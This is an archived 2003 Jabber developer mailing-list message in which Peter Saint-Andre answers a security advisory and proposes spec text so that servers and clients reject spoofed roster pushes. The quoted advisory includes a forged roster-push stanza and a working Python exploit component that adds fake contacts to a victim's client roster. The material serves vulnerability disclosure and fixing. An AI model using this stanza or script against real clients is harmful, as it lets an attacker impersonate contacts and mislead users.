@@ -1,0 +1,289 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [JDEV] [SECURITY] Remote roster manipulation bug in various Jabber clients
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:jdev%40jabber.org?Subject=Re%3A%20%5BJDEV%5D%20%5BSECURITY%5D%20Remote%20roster%20manipulation%20bug%20in%20various%20Jabber%20clients&In-Reply-To=%3C20030703162722.GB21872%40jabber.org%3E">
+   <META NAME="robots" CONTENT="index,nofollow">
+   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
+   <LINK REL="Previous"  HREF="075535.html">
+   <LINK REL="Next"  HREF="075545.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[JDEV] [SECURITY] Remote roster manipulation bug in various Jabber clients</H1>
+    <B>Peter Saint-Andre</B> 
+    <A HREF="mailto:jdev%40jabber.org?Subject=Re%3A%20%5BJDEV%5D%20%5BSECURITY%5D%20Remote%20roster%20manipulation%20bug%20in%20various%20Jabber%20clients&In-Reply-To=%3C20030703162722.GB21872%40jabber.org%3E"
+       TITLE="[JDEV] [SECURITY] Remote roster manipulation bug in various Jabber clients">stpeter at jabber.org
+       </A><BR>
+    <I>Thu Jul  3 11:27:22 CDT 2003</I>
+    <P><UL>
+        <LI>Previous message: <A HREF="075535.html">[JDEV] [SECURITY] Remote roster manipulation bug in various Jabber clients
+</A></li>
+        <LI>Next message: <A HREF="075545.html">[xmppwg] Re: [JDEV] [SECURITY] Remote roster manipulation bug in various Jabber clients
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#75544">[ date ]</a>
+              <a href="thread.html#75544">[ thread ]</a>
+              <a href="subject.html#75544">[ subject ]</a>
+              <a href="author.html#75544">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>This is a server bug. With what server did you test this? AFAIK, both
+jabberd 1.4.* and the Jabber Inc. server do the right thing here.
+
+The correct behavior is as follows (I have added this text to my working
+copy of draft-ietf-xmpp-im):
+
+  A server MUST ignore any 'to' address on a roster &quot;set&quot;, and 
+  MUST treat any roster &quot;set&quot; as applying to the sender. For added 
+  safety, a client SHOULD check the &quot;from&quot; address of a roster &quot;push&quot; 
+  to ensure that it is from a trusted source; specifically, the stanza 
+  should have no 'from' attribute (i.e., implicitly from the server) 
+  or the JID contained in the 'from' attribute should match the user's 
+  bare JID or full JID; otherwise, the client SHOULD ignore the roster 
+  &quot;push&quot;.
+
+Peter
+
+On Wed, Jul 02, 2003 at 10:05:11PM +0200, Jacek Konieczny wrote:
+&gt;<i> DESCRIPTION
+</I>&gt;<i> 
+</I>&gt;<i> From <A HREF="http://www.jabber.org/">http://www.jabber.org/</A> :
+</I>&gt;<i> 
+</I>&gt;<i>   Jabber is an open XML protocol for the real-time exchange of messages
+</I>&gt;<i>   and presence between any two points on the Internet. The first
+</I>&gt;<i>   application of Jabber technology is an asynchronous, extensible instant
+</I>&gt;<i>   messaging platform, and an IM network that offers functionality similar
+</I>&gt;<i>   to legacy IM systems such as AIM, ICQ, MSN, and Yahoo. However, Jabber
+</I>&gt;<i>   offers several advantages over legacy IM systems.
+</I>&gt;<i> 
+</I>&gt;<i> RFC documents describing Jabber protocol (know as XMPP now) are being
+</I>&gt;<i> prepared.
+</I>&gt;<i> 
+</I>&gt;<i> I have found a bug in most Jabber clients which allows to remotely
+</I>&gt;<i> modify roster (list of contacts) displayed by the client. This can be
+</I>&gt;<i> done by anyone who is able to establish his own Jabber server and allows
+</I>&gt;<i> to forge contacts seen by the user. The actual roster stored on server
+</I>&gt;<i> may not be modified directly using this bug.
+</I>&gt;<i> 
+</I>&gt;<i> I was thinking about informing authors first, but I would not be able to
+</I>&gt;<i> test all Jabber clients and reach authors of all vulnerable clients. So
+</I>&gt;<i> only some of them would be in privileged position.
+</I>&gt;<i> 
+</I>&gt;<i> DETAILS
+</I>&gt;<i> 
+</I>&gt;<i> 1. Background
+</I>&gt;<i> 
+</I>&gt;<i> Roster is contact list stored on Jabber server. It is usually retrieved
+</I>&gt;<i> by clients on login, managed by client, but always synchronized with
+</I>&gt;<i> server. Roster contains following information:
+</I>&gt;<i> 
+</I>&gt;<i> - JID (jabber id) of contact - unique for each item
+</I>&gt;<i> - contact name (nickname)
+</I>&gt;<i> - list of groups (may be empty)
+</I>&gt;<i> - presence subscriptions (information if contact can see user's presence
+</I>&gt;<i>   and if user can see contact's presence)
+</I>&gt;<i> - subscription state (if presence subscription/unsubscription is pending)
+</I>&gt;<i> 
+</I>&gt;<i> Multiple clients may be logged to the same Jabber account at once and
+</I>&gt;<i> their rosters are synchronized. Roster may also be changed due to
+</I>&gt;<i> presence subscription changes, which are managed by server. All roster
+</I>&gt;<i> changes in clients are sent to server, and all changes in server are
+</I>&gt;<i> sent to all connected clients. These &quot;roster pushes&quot; are sent as &quot;IQ&quot;
+</I>&gt;<i> request with &quot;jabber:iq:roster&quot; namespace.
+</I>&gt;<i> 
+</I>&gt;<i> Such update request sent by server looks like this:
+</I>&gt;<i> &lt;iq type='set'&gt;
+</I>&gt;<i> 	&lt;query xmlns='jabber:iq:roster'&gt;
+</I>&gt;<i> 		&lt;item jid='<A HREF="http://mail.jabber.org/mailman/listinfo/jdev">jajcus at jabber.bnet.pl</A>' 
+</I>&gt;<i> 			name='Jajcus' 
+</I>&gt;<i> 			subscription='both'&gt;
+</I>&gt;<i> 				&lt;group&gt;Jabber Hackers&lt;/group&gt;
+</I>&gt;<i> 		&lt;/item&gt;
+</I>&gt;<i> 	&lt;/query&gt;
+</I>&gt;<i> &lt;/iq&gt;
+</I>&gt;<i> 
+</I>&gt;<i> According to XMPP specs the &lt;iq/&gt; stanza could contain &quot;from&quot; and &quot;to&quot;
+</I>&gt;<i> attributes which should contain full JID of the session then.
+</I>&gt;<i> 
+</I>&gt;<i> If the &quot;subscription&quot; attribute is set to &quot;remove&quot; then given item is 
+</I>&gt;<i> to be removed.
+</I>&gt;<i> 
+</I>&gt;<i> 2. Vulnerability
+</I>&gt;<i> 
+</I>&gt;<i> Many Jabber clients don't check &quot;from&quot; attribute of the roster push.
+</I>&gt;<i> Such &lt;iq/&gt; stanza may be sent by anyone and will be routed to the client
+</I>&gt;<i> session it was addressed to. Such stanza is processed by vulnerable
+</I>&gt;<i> client as it was generated by server.
+</I>&gt;<i> 
+</I>&gt;<i> By sending following stanza (directed to victim's full JID):
+</I>&gt;<i> 
+</I>&gt;<i> &lt;iq type='set' to='<A HREF="http://mail.jabber.org/mailman/listinfo/jdev">victim at jabber.server</A>/resource'&gt;
+</I>&gt;<i> 	&lt;query xmlns='jabber:iq:roster'&gt;
+</I>&gt;<i> 		&lt;item jid='<A HREF="http://mail.jabber.org/mailman/listinfo/jdev">jajcus at jabber.bnet.pl</A>' 
+</I>&gt;<i> 			name='Jajcus' 
+</I>&gt;<i> 			subscription='both'&gt;
+</I>&gt;<i> 				&lt;group&gt;Jabber Hackers&lt;/group&gt;
+</I>&gt;<i> 		&lt;/item&gt;
+</I>&gt;<i> 	&lt;/query&gt;
+</I>&gt;<i> &lt;/iq&gt;
+</I>&gt;<i> 
+</I>&gt;<i> One would be able to add me to roster in victims client.
+</I>&gt;<i> 
+</I>&gt;<i> 3. Impact
+</I>&gt;<i> 
+</I>&gt;<i> The attack cannot be done from Jabber client connection to jabberd 1.4.x
+</I>&gt;<i> server because of similar bug (or feature) in this server - it doesn't
+</I>&gt;<i> check &quot;to&quot; attribute and all such &lt;iq/&gt;s treats as directed to the
+</I>&gt;<i> server. Attacker roster stored on server is modified instead of victims
+</I>&gt;<i> ones.
+</I>&gt;<i> 
+</I>&gt;<i> For attack to succeed one must know not only user's bare JID, but also
+</I>&gt;<i> name of a connected resource. Presence from the user is needed to get
+</I>&gt;<i> such information, but usually it may be guessed - it would usually be
+</I>&gt;<i> client name (&quot;Psi&quot;,&quot;tkabber&quot;, etc.) or location (&quot;Home&quot;,&quot;Work&quot;,etc.).
+</I>&gt;<i> 
+</I>&gt;<i> By using this vulnerability and modifying someone's roster one may make
+</I>&gt;<i> him start chat or send file to a person user doesn't intend contact
+</I>&gt;<i> with. This would require send one &lt;iq/&gt; to remove original entry, second
+</I>&gt;<i> one to add new entry with the same name and usually &lt;presence/&gt; to show
+</I>&gt;<i> the contact available. The new JID will usually be visible in chat
+</I>&gt;<i> window or in roster item details, but users usually care about contact
+</I>&gt;<i> name only.
+</I>&gt;<i> 
+</I>&gt;<i> This method changes roster copy in client only and doesn't change
+</I>&gt;<i> original roster on server. But if victim changes the forged entry 
+</I>&gt;<i> (eg. to fix a typo) it will be sent to his server. However subscription
+</I>&gt;<i> information cannot be changed this way.
+</I>&gt;<i> 
+</I>&gt;<i> 4. Vulnerable software
+</I>&gt;<i> 
+</I>&gt;<i> I have tested:
+</I>&gt;<i> 
+</I>&gt;<i> - Gabber 0.8.8
+</I>&gt;<i> - tkabber 0.9.4beta
+</I>&gt;<i> - Psi 0.8.7
+</I>&gt;<i> - Psi 0.9
+</I>&gt;<i> 
+</I>&gt;<i> And I found all of them vulnerable.
+</I>&gt;<i> 
+</I>&gt;<i> 5. Proposed fix
+</I>&gt;<i> 
+</I>&gt;<i> In clients before handling roster pushes check &quot;from&quot; attribute and drop
+</I>&gt;<i> the request if &quot;from&quot; is set and is not session's full JID. 
+</I>&gt;<i> 
+</I>&gt;<i> 6. Possible workaround
+</I>&gt;<i> 
+</I>&gt;<i> On server drop all &lt;iq/&gt; stanzas from &quot;outside&quot; containing
+</I>&gt;<i> &quot;jabber:iq:roster&quot; namespace. However, this breaks normal XMPP stanza
+</I>&gt;<i> routing rules.
+</I>&gt;<i> 
+</I>&gt;<i> 7. Exploit
+</I>&gt;<i> 
+</I>&gt;<i> In attachment.
+</I>&gt;<i> 
+</I>&gt;<i> 8. Thanks
+</I>&gt;<i> 
+</I>&gt;<i> Thanks to kalma, bluszcz and tristan for allowing me to hack their
+</I>&gt;<i> clients and to mmazur for the help with the advisory :)
+</I>&gt;<i> 
+</I>&gt;<i> Greets,
+</I>&gt;<i> 	Jacek Konieczny
+</I>
+&gt;<i> #!/usr/bin/python
+</I>&gt;<i> #
+</I>&gt;<i> # exploit for &quot;remote roster manipulation&quot; bug of various Jabber clients
+</I>&gt;<i> # (c) 2003 Jacek Konieczny &lt;<A HREF="http://mail.jabber.org/mailman/listinfo/jdev">jajcus at bnet.pl</A>&gt;
+</I>&gt;<i> #
+</I>&gt;<i> # Requires: <A HREF="http://jabberpy.sourceforge.net/">http://jabberpy.sourceforge.net/</A>
+</I>&gt;<i> #
+</I>&gt;<i> # This exploit is an external component to jabber server which adds
+</I>&gt;<i> # new item to victims roster (client local copy only)
+</I>&gt;<i> #
+</I>&gt;<i> # To link the exploit with your jabberd following fragment to your jabber.xml
+</I>&gt;<i> # and restart jabberd.
+</I>&gt;<i> # source.domain must be valid DNS hostname and point to your jabberd
+</I>&gt;<i> #
+</I>&gt;<i> # &lt;service id=&quot;bug&quot;&gt;
+</I>&gt;<i> #     &lt;host&gt;source.domain&lt;/host&gt;
+</I>&gt;<i> #     &lt;accept&gt;
+</I>&gt;<i> #         &lt;ip&gt;127.0.0.1&lt;/ip&gt;
+</I>&gt;<i> #         &lt;secret&gt;secret&lt;/secret&gt;
+</I>&gt;<i> #         &lt;port&gt;6969&lt;/port&gt;
+</I>&gt;<i> #     &lt;/accept&gt;
+</I>&gt;<i> # &lt;/service&gt;
+</I>&gt;<i> #
+</I>&gt;<i> # Usage:
+</I>&gt;<i> #	./exploit.py target-full-jid
+</I>&gt;<i> #
+</I>&gt;<i> # eg.:
+</I>&gt;<i> #	./exploit.py <A HREF="http://mail.jabber.org/mailman/listinfo/jdev">someone at jabber.nowhere</A>/Home
+</I>&gt;<i> 
+</I>&gt;<i> 
+</I>&gt;<i> import jabber
+</I>&gt;<i> import xmlstream
+</I>&gt;<i> import sys
+</I>&gt;<i> 
+</I>&gt;<i> def iq_handler(con,iq):
+</I>&gt;<i> 	print &quot;Got IQ:&quot;,str(iq.asNode())
+</I>&gt;<i> 
+</I>&gt;<i> me=&quot;source.domain&quot;
+</I>&gt;<i> 
+</I>&gt;<i> con = jabber.Component(host='127.0.0.1', debug=0, port=6969, log='log')
+</I>&gt;<i> con.connect()
+</I>&gt;<i> con.process(1)
+</I>&gt;<i> con.auth('secret')
+</I>&gt;<i> con.setIqHandler(iq_handler)
+</I>&gt;<i> 
+</I>&gt;<i> try:
+</I>&gt;<i> 	iq=jabber.Iq(to=sys.argv[1],type=&quot;set&quot;)
+</I>&gt;<i> 	iq.setFrom(me)
+</I>&gt;<i> 	query=iq.setQuery('jabber:iq:roster')
+</I>&gt;<i> 	group=xmlstream.Node(&quot;group&quot;)
+</I>&gt;<i> 	group.putData(&quot;Bugs&quot;)
+</I>&gt;<i> 	item=xmlstream.Node(&quot;item&quot;)
+</I>&gt;<i> 	item.putAttr(&quot;jid&quot;,&quot;<A HREF="http://mail.jabber.org/mailman/listinfo/jdev">bug at bug.nowhere</A>&quot;)
+</I>&gt;<i> 	item.putAttr(&quot;name&quot;,&quot;BUG! BUG! BUG!&quot;)
+</I>&gt;<i> 	item.putAttr(&quot;subscription&quot;,&quot;none&quot;)
+</I>&gt;<i> 	item.insertNode(group)
+</I>&gt;<i> 	query.insertNode(item)
+</I>&gt;<i> 	con.send(iq)
+</I>&gt;<i> 	while(1):
+</I>&gt;<i> 		con.process(10)
+</I>&gt;<i> except KeyboardInterrupt:
+</I>&gt;<i>     con.disconnect()
+</I>
+
+
+
+-- 
+Peter Saint-Andre
+Jabber Software Foundation
+<A HREF="http://www.jabber.org/people/stpeter.php">http://www.jabber.org/people/stpeter.php</A>
+
+
+</PRE>
+
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI>Previous message: <A HREF="075535.html">[JDEV] [SECURITY] Remote roster manipulation bug in various Jabber clients
+</A></li>
+	<LI>Next message: <A HREF="075545.html">[xmppwg] Re: [JDEV] [SECURITY] Remote roster manipulation bug in various Jabber clients
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#75544">[ date ]</a>
+              <a href="thread.html#75544">[ thread ]</a>
+              <a href="subject.html#75544">[ subject ]</a>
+              <a href="author.html#75544">[ author ]</a>
+         </LI>
+       </UL>
+
+<hr>
+<a href="http://mail.jabber.org/mailman/listinfo/jdev">More information about the JDev
+mailing list</a><br>
+</body></html>
